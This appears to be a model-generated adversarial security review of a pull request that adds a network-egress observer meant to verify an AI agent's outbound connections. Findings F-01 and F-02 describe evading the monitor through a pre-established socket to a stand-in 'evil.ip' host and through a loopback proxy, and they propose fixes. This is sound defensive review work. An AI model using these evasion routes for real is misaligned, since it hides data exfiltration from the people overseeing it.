# PR#40 egress-observer certification panel: x-ai/grok-4.5

_finish=stop seconds=207.3 cost=$0.0797 usage={'prompt_tokens': 54543, 'completion_tokens': 10558, 'total_tokens': 65101, 'cost': 0.0797364, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 54528, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.0797364, 'upstream_inference_prompt_cost': 0.0163884, 'upstream_inference_completions_cost': 0.063348}, 'completion_tokens_details': {'reasoning_tokens': 7898, 'image_tokens': 0, 'audio_tokens': 0}}_

# Adversarial Review — PR #40 Independent Egress Observer

## Findings

### F-01 / Pre-established TCP socket evades SYN-only strong tier (false True)
- **SEVERITY:** HIGH
- **LOCATION:** `collaborator/egressobserver.py:88-94` (`_nft_ruleset` SYN filter); `reconcile` at `:288-318`; window at `begin`/`end` `:321-348`
- **CONCRETE INPUT/BYPASS:**
  1. Before `web_fetch`/`net_post` (or in the same process earlier), open and hold `socket.create_connection(("evil.ip", 443))` (or any TCP) as the Collaborator uid.
  2. During the observation window, exfil on that **already-established** socket while `egress.fetch` performs a normal NEW SYN to the claimed host.
  3. nft rule matches only `tcp flags & (syn|ack) == syn` → evil sends no SYN in-window → not in `@dests4`/`@dests6`.
  4. `observed == claimed`, `unexpected == ∅`, `claimed_unobserved == ∅` → `reconciled is True`.
- **WHY IT BREAKS A GUARANTEE:** Certification headline says a second in-process client is observed and surfaced at the strong tier, and that `reconcile` never returns a True it did not earn. Here the kernel vantage **never sees** the second client; the mediated record stays benign; strong tier still returns **True** (“hands didn’t lie”).
- **ANOTHER CHECK CATCHES IT?** No. netns only proves some socket existed in the ns; it does not bind bytes to the record. Channel log is the compromised/benign path. P-01 surfaces nothing because `reconciled=True`.
- **FIX:** Document as an explicit residual **or** close it: e.g. also sample live `ss`/`/proc/net/tcp` ESTABLISHED set at `end()` and flag uid sockets whose remote ∉ claimed (accept FP noise); and/or take a pre-window ESTABLISHED baseline in `begin()` and treat in-window *byte-count growth* / still-alive remotes as evidence. Full fix is the deferred enforced chokepoint.

### F-02 / Loopback-excluded proxy path (false True)
- **SEVERITY:** MEDIUM
- **LOCATION:** `collaborator/egressobserver.py:91-94` (`daddr != 127.0.0.0/8`, `ip6 daddr != ::1`)
- **CONCRETE INPUT/BYPASS:** Second client connects to `127.0.0.1:PORT` (local forwarder/socks run as another uid, or even a same-uid helper that then egresses outside the SYN window). Collaborator SYN to loopback is dropped from the set by design. Mediated client still does a clean public HTTPS connect → strong `True`.
- **WHY IT BREAKS A GUARANTEE:** Same class as F-01: second channel + clean record + strong True. Loopback exclusion is intentional for noise, but it creates a clean observation hole.
- **ANOTHER CHECK CATCHES IT?** Only if the proxy’s **own** outbound SYN runs as the **same** uid **during** the window (then it is caught). Cross-uid local proxy: no. egress.py private-IP pin does not apply to the second client.
- **FIX:** Treat loopback TCP SYNs as first-class observed dests (or separate “loopback_activity” flag). Prefer claiming residual explicitly next to UDP/DNS.

### F-03 / `begin()` ignores `install()` failure (attribution / stale-table noise; not a clean false True)
- **SEVERITY:** LOW
- **LOCATION:** `collaborator/egressobserver.py:328-331` (`install()` return discarded); contrast `install` `:112-126`
- **CONCRETE INPUT/BYPASS:** `observer_available()` cached `TIER_STRONG`; later `install()` returns `False` (delete OK + create fail → no table; or delete fail + create fail → stale table).
  - delete∅+create fail: `_nft_snapshot()` → `None` → `end` forces `TIER_UNAVAILABLE` → `reconciled is None` (safe).
  - stale table still present: synthetic empty `before` + old `after.dests` → **false-positive** `False` (unexpected leftovers), or vacuous match if leftovers ⊆ claimed.
- **WHY IT BREAKS A GUARANTEE:** Does **not** reliably mint an unearned True (failed fresh install without a readable table degrades to `None`). Does weaken “fresh empty table ⇒ this action’s dest-set” and can spam discrepancy evidence.
- **ANOTHER CHECK CATCHES IT?** Degrade-to-`None` on unreadable table yes; stale-table FP no independent suppressor.
- **FIX:** `if not install(): return EgressSnapshot(tier=TIER_UNAVAILABLE)` (or fall back to proc for this window only). Optionally `list table` after install and refuse STRONG without proof of empty sets.

### F-04 / Availability probe cached forever
- **SEVERITY:** LOW
- **LOCATION:** `collaborator/egressobserver.py:74`, `:248-270` (`_available_tier`)
- **CONCRETE INPUT/BYPASS:** First `observer_available()` during transient `sudo -n`/nft failure → cache `TIER_PROC` or `TIER_UNAVAILABLE` for process lifetime even after privilege appears; inverse: cache STRONG after probe then lose privilege → per-action degrade to `None` via failed snapshot (safe).
- **WHY IT BREAKS A GUARANTEE:** Not a false True; can permanently under-observe (miss strong tier) → more `None`, never a fake verify. Does not block egress.
- **ANOTHER CHECK CATCHES IT?** No.
- **FIX:** TTL the cache, or re-probe on STRONG install failure; keep fail-open to weaker tier.

### F-05 / Dual-stack / IPv6 presentation false-positive discrepancy
- **SEVERITY:** LOW (audit noise only; evidence-not-deny)
- **LOCATION:** `_parse_nft_set` `:154-175`; `_egress_claimed` `tools.py:444-449`; `reconcile` claimed/observed set equality
- **CONCRETE INPUT/BYPASS:** Kernel/nft JSON emits `2001:db8::1` while `resolved_ip` is a different textual form (or rare v4-mapped form). Sets disagree → `reconciled=False` with unexpected/claimed_unobserved.
- **WHY IT BREAKS A GUARANTEE:** Does **not** break false-True or P-01; harms signal quality only. egress.py pins a single IP (no Happy Eyeballs multi-connect), so classic dual-stack double-SYN FP is largely avoided on the mediated path.
- **ANOTHER CHECK CATCHES IT?** N/A (noise).
- **FIX:** Canonicalize with `ipaddress.ip_address(...).compressed` on both sides before set ops.

### F-06 / Delete-then-create gap at `begin()` (narrow miss window)
- **SEVERITY:** LOW
- **LOCATION:** `install` `:122-124`; `begin` `:328-331`
- **CONCRETE INPUT/BYPASS:** Between `nft delete table inet salient_obs` and successful `-f` add, a same-uid SYN is not recorded. Requires racing `begin()` itself, not the fetch body.
- **WHY IT BREAKS A GUARANTEE:** Theoretical miss of a concurrent second client only during setup; after `begin()` returns, hook is up. Weak practical bypass vs F-01.
- **ANOTHER CHECK CATCHES IT?** No.
- **FIX:** `flush set` on an existing table instead of delete/recreate; or add table once and reset sets/counter atomically.

---

## Non-findings (attacks blocked or out of scope)

| Attack | Result |
|--------|--------|
| **Proc clean → True** | Blocked. `reconcile` `:314-316` forces `None` on proc with no discrepancy. |
| **Failed/None nft snapshot → True** | Blocked. `end` `:340-343` maps failed snapshot to `TIER_UNAVAILABLE` → `reconciled=None`. |
| **Strong claimed-unobserved → True** | Blocked. `:308-310` → `False`. |
| **Empty/garbage nft JSON /proc hex** | Parsers fail closed to empty/`None`; no raise out of parse paths (`:154-175`, `:192-214`, `:217-244`). Seam `_egress_claimed` ports are literal `443`. |
| **`sudo` password hang** | Blocked. `_NFT` uses `sudo -n` (`:68-71`); tested. |
| **`nft flush ruleset` / other tables / drop|reject** | Blocked. Only `delete table inet salient_obs` + stdin create of that table; ruleset `policy accept`, `update`+`counter` only. BlastRadiusSafety pins argv/body. **Cannot disturb host firewall** on reviewed paths. |
| **Discrepancy changes RAN/cleared** | Blocked. `governance.py` egress branch: `RAN if ok else FAILED`, `cleared=ok` from channel record; `egress_reconciled` is parallel evidence only. Summary loud; status unchanged. |
| **Observer failure fails a good egress** | On the wired path, `begin`/`end` are written not to raise; failed vantage → `None`, fetch still runs. (If `end` ever raised, `execute_and_verify`’s broad `except` would FAILED — not observed with current parsers + `_egress_claimed`.) |
| **UDP/DNS, root flush, same-uid co-tenant FP, enforced chokepoint** | Acknowledged residuals / out of scope — not re-filed. |
| **Wrong dest by mediated client (new SYN)** | Caught: observed vs claimed set mismatch → `False`. Live test `test_stray_second_connection_is_caught`. |
| **Second client NEW SYN in-window same uid** | Caught at strong tier. |

---

## CERTIFICATION LINE

**NOT-CERTIFIED** (narrow but real): `reconcile` does not mint True from proc/empty/failed nft snapshots, and host-firewall isolation + evidence-only gating hold — but a **same-uid second channel that emits without a mid-window NEW SYN** (pre-established TCP and/or loopback proxy) yields a **strong-tier True while unobserved egress occurs**, so the joint headline (“never false True” + “second client observed at strong tier”) does not fully hold.

---

## STEELMAN

The tri-state design is the right core: True is gated on `TIER_STRONG` only; proc and UNAVAILABLE cannot counterfeit verification; failed nft reads become `None` rather than vacuous success; and blast radius is genuinely scoped to one `inet` table with `policy accept` and tests that pin argv. Wiring correctly keeps P-01 (discrepancy never drives `cleared`/RAN). Against the threat the PR actually instruments — **new uid-scoped TCP SYNs during a serial window** — wrong dest and in-window second connects are observed and surfaced.

---

## VERDICT

**MINOR_ISSUES** — Cardinal false-True paths via racy proc / failed nft / strong claimed-unobserved mis-score are closed; firewall non-interference and evidence-only posture are sound; residual **SYN-only / loopback under-observation** allows an unearned clean strong reconcile when a second client avoids a mid-window SYN.

**Single highest-value fix:** In `end()` (strong tier), union nft dests with a uid-scoped `/proc/net/tcp{,6}` ESTABLISHED/SYN_SENT sample and flag remotes ∉ claimed (including loopback if you want proxy coverage) — or explicitly carve pre-established + loopback next to UDP in the certified residual list and narrow the “second client” claim to **new SYNs in-window**.
